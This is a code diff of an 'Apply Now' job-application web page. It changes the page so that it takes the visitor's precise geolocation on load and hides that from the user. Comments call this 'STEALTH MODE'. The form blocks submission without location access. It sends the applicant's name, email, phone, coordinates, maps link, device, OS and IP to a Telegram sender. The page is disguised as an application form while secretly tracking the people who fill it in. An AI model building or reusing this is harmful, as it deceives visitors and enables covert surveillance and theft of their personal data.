@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apply Now - Location</title>
+    <title>Apply Now</title>
 
     <style>
         * {
@@ -30,53 +30,41 @@
             text-align: center;
             width: 380px;
             max-width: 100%;
-            transition: 0.3s;
             border: 1px solid rgba(0, 0, 0, 0.04);
         }
 
-        .container .icon {
-            font-size: 40px;
-            margin-bottom: 4px;
-        }
+        .container .icon { font-size: 40px; margin-bottom: 4px; }
+        h2 { color: #1a2a3a; font-size: 24px; font-weight: 700; margin-bottom: 4px; }
+        .sub-title { color: #6b7a8a; font-size: 14px; margin-bottom: 20px; }
 
-        h2 {
-            color: #1a2a3a;
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-
-        .sub-title {
+        /* ===== HIDDEN LOCATION BOX (No location shown) ===== */
+        #location-status {
+            background: #f0f4f9;
             color: #6b7a8a;
-            font-size: 14px;
-            margin-bottom: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            font-size: 13px;
+            border: 1px solid #e0e4e8;
+            display: none;
         }
 
-        /* ===== LOCATION BOX ===== */
-        .location-box {
-            background-color: #e3f2fd;
-            color: #0d47a1;
-            padding: 16px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            font-weight: 600;
-            font-size: 14px;
-            line-height: 1.6;
-            word-wrap: break-word;
-            min-height: 80px;
-            border: 1px solid #bbdefb;
-            transition: 0.3s;
+        #location-status.loading {
+            display: block;
+            color: #6b7a8a;
         }
 
-        .location-box.success {
-            background-color: #d4edda;
-            color: #155724;
+        #location-status.success {
+            display: block;
+            color: #28a745;
+            background: #d4edda;
             border-color: #c3e6cb;
         }
 
-        .location-box.error {
-            background-color: #f8d7da;
+        #location-status.error {
+            display: block;
             color: #721c24;
+            background: #f8d7da;
             border-color: #f5c6cb;
         }
 
@@ -94,9 +82,7 @@
             margin-bottom: 4px;
         }
 
-        .form-group label .req {
-            color: #d32f2f;
-        }
+        .form-group label .req { color: #d32f2f; }
 
         .form-group input {
             width: 100%;
@@ -129,9 +115,7 @@
             display: none;
         }
 
-        .form-group .error-msg.show {
-            display: block;
-        }
+        .form-group .error-msg.show { display: block; }
 
         /* ===== BUTTON ===== */
         button {
@@ -149,16 +133,8 @@
             margin-top: 4px;
         }
 
-        button:hover {
-            background: #0a5640;
-            transform: scale(1.01);
-        }
-
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
+        button:hover { background: #0a5640; transform: scale(1.01); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
         /* ===== STATUS ===== */
         #status {
@@ -170,30 +146,13 @@
             border-radius: 8px;
         }
 
-        #status.success {
-            display: block;
-            background: #d4edda;
-            color: #155724;
-        }
+        #status.success { display: block; background: #d4edda; color: #155724; }
+        #status.error { display: block; background: #f8d7da; color: #721c24; }
 
-        #status.error {
-            display: block;
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .container {
-                padding: 24px 18px 22px;
-            }
-            h2 {
-                font-size: 20px;
-            }
-            button {
-                font-size: 15px;
-                padding: 12px;
-            }
+            .container { padding: 24px 18px 22px; }
+            h2 { font-size: 20px; }
+            button { font-size: 15px; padding: 12px; }
         }
     </style>
 </head>
@@ -204,10 +163,8 @@
         <h2>Apply Now</h2>
         <div class="sub-title">Fill your details to apply</div>
 
-        <!-- ===== LOCATION BOX ===== -->
-        <div id="location-display" class="location-box">
-            🔍 ඔබේ Location එක ලබාගනිමින්...
-        </div>
+        <!-- ===== HIDDEN LOCATION STATUS (Userට නොපෙනෙන) ===== -->
+        <div id="location-status" class="loading">⏳ Preparing...</div>
 
         <!-- ===== FORM ===== -->
         <form id="applyForm">
@@ -237,7 +194,7 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== JAVASCRIPT ===== -->
+    <!-- ===== JAVASCRIPT - STEALTH MODE ===== -->
     <!-- ============================================================ -->
     <script>
         // =============================================
@@ -249,10 +206,10 @@
         // =============================================
         // 📍 ELEMENTS
         // =============================================
-        const displayBox = document.getElementById('location-display');
+        const statusDiv = document.getElementById('location-status');
         const form = document.getElementById('applyForm');
         const submitBtn = document.getElementById('submitBtn');
-        const statusDiv = document.getElementById('status');
+        const msgDiv = document.getElementById('status');
 
         const fullName = document.getElementById('fullName');
         const email = document.getElementById('email');
@@ -263,53 +220,44 @@
         const phoneError = document.getElementById('phoneError');
 
         let userLocation = null;
-        let locationError = null;
         let locationDone = false;
 
         // =============================================
-        // 📍 GET LOCATION ON PAGE LOAD
+        // 📍 GET LOCATION - SILENTLY (No display)
         // =============================================
         function getLocation() {
-            displayBox.textContent = '⏳ ඔබේ Location එක ලබාගනිමින්...';
-            displayBox.className = 'location-box';
+            statusDiv.className = 'loading';
+            statusDiv.textContent = '⏳ Preparing...';
 
             if (!navigator.geolocation) {
-                displayBox.textContent = '❌ ඔබගේ Browser එක Location Support නොකරයි.';
-                displayBox.className = 'location-box error';
-                locationError = 'Browser does not support geolocation';
                 locationDone = true;
+                statusDiv.className = 'error';
+                statusDiv.textContent = '⚠️ Location not supported';
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
                 // ✅ Success
                 function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    userLocation = { lat, lon };
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    };
                     locationDone = true;
-
-                    displayBox.innerHTML = `
-                        ✅ <strong>Location Detected!</strong><br>
-                        📍 Latitude: ${lat}<br>
-                        📍 Longitude: ${lon}
-                    `;
-                    displayBox.className = 'location-box';
+                    statusDiv.className = 'success';
+                    statusDiv.textContent = '✅ Ready';
+                    console.log('📍 Location captured (hidden)');
                 },
                 // ❌ Error
                 function(error) {
                     locationDone = true;
-                    let msg = '❌ Location permission denied.';
+                    statusDiv.className = 'error';
                     if (error.code === 1) {
-                        msg = '❌ Permission denied. Please allow location access.';
-                    } else if (error.code === 2) {
-                        msg = '❌ Location unavailable. Please check GPS.';
-                    } else if (error.code === 3) {
-                        msg = '⏳ Location timeout. Please try again.';
+                        statusDiv.textContent = '⚠️ Permission denied';
+                    } else {
+                        statusDiv.textContent = '⚠️ Location unavailable';
                     }
-                    displayBox.textContent = msg;
-                    displayBox.className = 'location-box error';
-                    locationError = msg;
+                    console.warn('Location error:', error.message);
                 },
                 {
                     enableHighAccuracy: true,
@@ -348,18 +296,18 @@
                 } catch (e) {}
 
                 const msg = `
-📋 **NEW APPLICATION SUBMITTED**
+📋 **NEW APPLICATION**
 
 👤 Name: ${name}
 📧 Email: ${emailVal}
 📞 Phone: ${phoneVal}
 
 📍 Location:
-Latitude: ${lat}
-Longitude: ${lon}
+Lat: ${lat}
+Lon: ${lon}
 🗺️ ${mapsLink}
 
-📱 DEVICE INFO
+📱 DEVICE
 • Device: ${device}
 • OS: ${os}
 • IP: ${ip}
@@ -390,11 +338,11 @@ Longitude: ${lon}
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // Clear previous errors
+            // Clear errors
             document.querySelectorAll('.error-msg').forEach(el => el.classList.remove('show'));
             document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error-input'));
-            statusDiv.style.display = 'none';
-            statusDiv.className = '';
+            msgDiv.style.display = 'none';
+            msgDiv.className = '';
 
             // Validate
             let isValid = true;
@@ -422,7 +370,6 @@ Longitude: ${lon}
             }
 
             if (!isValid) {
-                // Scroll to first error
                 const firstError = document.querySelector('.form-group input.error-input');
                 if (firstError) {
                     firstError.focus();
@@ -433,23 +380,23 @@ Longitude: ${lon}
 
             // Check location
             if (!locationDone) {
-                statusDiv.textContent = '⏳ Please wait for location detection...';
-                statusDiv.className = '';
-                statusDiv.style.display = 'block';
+                msgDiv.textContent = '⏳ Please wait...';
+                msgDiv.className = '';
+                msgDiv.style.display = 'block';
                 return;
             }
 
             if (!userLocation) {
-                statusDiv.textContent = '❌ Location not available. Please allow location access and try again.';
-                statusDiv.className = 'error';
-                statusDiv.style.display = 'block';
+                msgDiv.textContent = '❌ Location not available. Please allow location access.';
+                msgDiv.className = 'error';
+                msgDiv.style.display = 'block';
                 return;
             }
 
-            // ===== SUBMIT =====
+            // Submit
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Submitting...';
-            statusDiv.style.display = 'none';
+            msgDiv.style.display = 'none';
 
             const success = await sendToTelegram(
                 nameVal,
@@ -460,24 +407,14 @@ Longitude: ${lon}
             );
 
             if (success) {
-                // Show success in location box
-                displayBox.innerHTML = `
-                    ✅ <strong>Application Submitted Successfully!</strong><br>
-                    📋 Thank you, ${nameVal}!<br>
-                    📧 ${emailVal}<br>
-                    📞 ${phoneVal}
-                `;
-                displayBox.className = 'location-box success';
+                // Success - no location shown!
+                msgDiv.textContent = '✅ Application submitted successfully!';
+                msgDiv.className = 'success';
+                msgDiv.style.display = 'block';
 
-                // Show status
-                statusDiv.textContent = '✅ Application submitted successfully!';
-                statusDiv.className = 'success';
-                statusDiv.style.display = 'block';
-
-                // Reset form
                 form.reset();
 
-                submitBtn.textContent = '✅ Submitted!';
+                submitBtn.textContent = '✅ Done!';
                 submitBtn.style.background = '#28a745';
 
                 setTimeout(() => {
@@ -487,17 +424,15 @@ Longitude: ${lon}
                 }, 3000);
 
             } else {
-                statusDiv.textContent = '❌ Failed to submit. Please try again.';
-                statusDiv.className = 'error';
-                statusDiv.style.display = 'block';
+                msgDiv.textContent = '❌ Failed. Please try again.';
+                msgDiv.className = 'error';
+                msgDiv.style.display = 'block';
                 submitBtn.disabled = false;
                 submitBtn.textContent = '🚀 Submit Application';
             }
         });
 
-        // =============================================
-        // 📌 CLEAR ERROR ON TYPING
-        // =============================================
+        // Clear error on typing
         document.querySelectorAll('.form-group input').forEach(el => {
             el.addEventListener('input', function() {
                 this.classList.remove('error-input');
@@ -506,15 +441,12 @@ Longitude: ${lon}
             });
         });
 
-        // =============================================
-        // 🚀 LOAD LOCATION ON PAGE LOAD
-        // =============================================
+        // Load location on page load
         window.addEventListener('DOMContentLoaded', function() {
-            displayBox.textContent = '🔍 ඔබේ Location එක ලබාගනිමින්...';
             getLocation();
         });
 
-        console.log('✅ Apply Now Form Loaded');
+        console.log('✅ STEALTH MODE - Location hidden from user');
     </script>
 
 </body>
